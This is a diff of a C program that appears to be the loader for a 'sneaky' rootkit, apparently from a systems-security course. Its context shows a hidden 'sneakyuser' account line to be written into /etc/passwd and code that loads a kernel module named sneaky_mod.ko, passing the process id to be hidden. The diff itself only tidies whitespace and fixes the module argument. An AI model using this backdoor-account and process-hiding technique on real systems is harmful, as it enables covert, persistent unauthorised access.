@@ -4,14 +4,12 @@
 #include <unistd.h>
 #include <string.h>
 #include <sys/wait.h>
-
+#include <assert.h>
 
 char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
 char * etc = "/etc/passwd";
 char * temp = "/tmp/passwd";
 pid_t pid;
-
-
 
 void unload_module(){
 
@@ -50,7 +48,7 @@ void unload_module(){
 
 void load_module(){
 
-  pid_t parent_process = pid; 
+  pid_t parent_process = pid;
   pid_t load_pid = fork();
   
   if(load_pid < 0){
@@ -61,7 +59,8 @@ void load_module(){
   else if( load_pid == 0){
 
     char module_arg[50];
-    snprintf(module_arg,sizeof(module_arg), "parent_id = %d\n", parent_process);
+    int result = snprintf(module_arg, sizeof(module_arg), "sneaky_process_id=%d", (int)parent_process);
+    assert(result > 0);
     char * argv[4] = {"insmod", "sneaky_mod.ko", module_arg, NULL};
 
     int value = execvp("insmod", argv);
